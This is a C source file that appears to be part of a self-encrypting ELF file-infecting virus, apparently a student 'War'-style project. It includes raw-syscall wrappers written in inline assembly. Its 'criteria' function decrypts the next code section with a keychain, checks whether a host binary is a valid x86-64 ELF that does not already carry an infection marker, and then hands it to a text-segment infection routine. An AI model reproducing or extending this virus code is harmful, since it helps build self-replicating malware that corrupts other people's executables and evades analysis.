#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline int _open(const char *pathname, int flags, mode_t mode)
{
	int ret;

	asm volatile
	(
		"mov rdi, %0\n"
		"mov esi, %1\n"
		"mov edx, %2\n"

		"mov rax, 0x2\n"
		"syscall\n"
		:
		: "g"(pathname), "g"(flags), "g"(mode)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline int _close(int fd)
{
	int ret;

	asm volatile
	(
		"mov edi, %0\n"

		"mov rax, 0x3\n"
		"syscall\n"
		:
		: "g"(fd)
	);
	asm volatile
	(
		"mov %0, eax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
{
	ssize_t ret;

	asm volatile
	(
		"mov edi, %0\n"
		"mov rsi, %1\n"
		"mov rdx, %2\n"

		"mov rax, 0x1\n"
		"syscall\n"
		:
		: "g"(fd), "g"(buf), "g"(count)
	);
	asm volatile
	(
		"mov %0, rax\n"
		: "=r"(ret)
		:
	);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline size_t _strlen(const char *str)
{
	size_t ret = 0;

	if (str == NULL)
		return 0;

	while (str[ret])
		ret++;

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

#if DEBUG
	char function[] = "criteria:\t\t";
	char name[] = "/tmp/trace";
	int trace = _open(name, O_RDWR | O_APPEND, 0000);
	char newline = 0xa;
	char result = context + 48;
	
	if (trace > 0)
	{
		_write(trace, function, _strlen(function));
		_write(trace, &result, 1);
		_write(trace, &newline, 1);
	}

	_close(trace);
#endif

	if (context == FAILURE)
		goto label;

	if (host->filesize < sizeof(Elf64_Ehdr))
	{
		context = FAILURE;
		goto label;
	}
	if (host->header->e_shoff + (host->header->e_shnum * sizeof(Elf64_Shdr)) != host->filesize)
	{
		context = FAILURE;
		goto label;
	}
	if (*(uint32_t *)host->header != ELF_MAGIC_NUMBER)
	{
		context = FAILURE;
		goto label;
	}
	if (host->header->e_ident[EI_CLASS] != X86_64_MAGIC_NUMBER)
	{
		context = FAILURE;
		goto label;
	}
	if (host->header->e_entry == 0)
	{
		context = FAILURE;
		goto label;
	}
	if (*(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == INFECTED_MAGIC_NUMBER)
	{
		context = FAILURE;
		goto label;
	}

label:
//	update_keychain_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
//	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	text_infection(host, keychain, context);
}
